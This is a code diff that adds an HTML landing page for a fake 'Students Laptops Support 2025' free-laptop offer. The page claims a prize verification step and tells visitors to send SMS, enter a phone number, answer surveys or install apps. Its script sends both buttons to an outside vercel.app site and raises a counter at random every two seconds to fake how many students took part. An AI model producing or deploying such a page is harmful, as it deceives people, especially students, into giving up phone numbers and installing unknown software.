@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Students Laptops Support 2025 - Verification Step</title> <!-- Changed title for clarity -->
+    <style>
+        body { margin: 0; font-family: Arial, Helvetica, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; padding: 20px; }
+        .container { max-width: 500px; width: 100%; background-color: #ffffff; text-align: center; box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); }
+        .header-image { width: 100%; height: auto; display: block; }
+        h1 { font-size: 1.5rem; color: #333; padding: 20px 10px 15px 10px; margin: 0; }
+        .stats-bar { background-color: #a6d8a7; padding: 10px; }
+        .stats-bar p { margin: 0; font-size: 1.2rem; font-weight: bold; color: #333; }
+        .stats-bar .count { font-size: 2.5rem; font-weight: bold; color: #d9534f; margin-top: 5px; }
+        .offer-info { font-size: 1.1rem; font-weight: bold; color: #333; padding: 20px; margin: 0; background-color: #ffffff; border-bottom: 1px solid #ddd; }
+        .verification-details { padding: 20px; text-align: left; border: 1px solid #ddd; margin: 0 20px; background-color: #ffffff; }
+        .verification-details p { font-size: 1.1rem; line-height: 1.6; color: #333; margin: 0 0 15px 0; }
+        .verify-button { display: block; width: calc(100% - 40px); margin: 20px auto; padding: 15px; font-size: 1.3rem; font-weight: bold; color: #fff; background-color: #0b800b; border: none; border-radius: 8px; cursor: pointer; transition: background-color 0.2s; }
+        .verify-button:hover { background-color: #0a6d0a; }
+        .last-button { margin-bottom: 30px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="Laptop-offer.jpg" alt="Free Laptops for 2025 Students Edition" class="header-image">
+        <h1>STUDENTS LAPTOPS SUPPORT 2025</h1>
+        <div class="stats-bar">
+            <p>Till Today</p>
+            <p class="count">66611</p>
+        </div>
+        <p class="offer-info">Students have taken advantage of this offer.</p>
+        <div class="verification-details">
+            <p><strong>Congratulations! The last verification step, You might WIN ANYTHING, e.g Iphones, Ipads and many more gifts!.</strong></p>
+            <p>Verification methods; We may ask you to; Send SMS, Download, Enter phone number,Answer the Survey, Install the app or any other given task to Verify your phone number.</p>
+            <p><strong>Remember, this step is very important. Do not skip any step.</strong></p>
+        </div>
+        <button class="verify-button" id="firstVerifyBtn">VERIFY</button>
+        <button id="verifyNowBtn" class="verify-button last-button">VERIFY NOW</button>
+    </div>
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const verifyNowButton = document.getElementById('verifyNowBtn');
+            const firstVerifyButton = document.getElementById('firstVerifyBtn');
+            const redirectUrl = 'https://freelaptopschemes7.vercel.app'; // The new redirect link
+
+            // A single function to handle the redirection for both buttons
+            const redirectToVerification = () => {
+                window.location.href = redirectUrl;
+            };
+
+            if (verifyNowButton) {
+                // Point the "VERIFY NOW" button to the redirect function
+                verifyNowButton.addEventListener('click', redirectToVerification);
+            }
+
+            if (firstVerifyButton) {
+                // Point the "VERIFY" button to the redirect function
+                 firstVerifyButton.addEventListener('click', redirectToVerification);
+            }
+
+            const countElement = document.querySelector('.stats-bar .count');
+            if (countElement) {
+                let currentCount = parseInt(countElement.innerText.replace(/,/g, ''), 10);
+                if (isNaN(currentCount)) currentCount = 66611; 
+
+                setInterval(() => {
+                    const increment = Math.floor(Math.random() * (20 - 5 + 1)) + 5; 
+                    currentCount += increment;
+                    countElement.innerText = currentCount.toLocaleString();
+                }, 2000); 
+            }
+        });
+    </script>
+</body>
+</html>
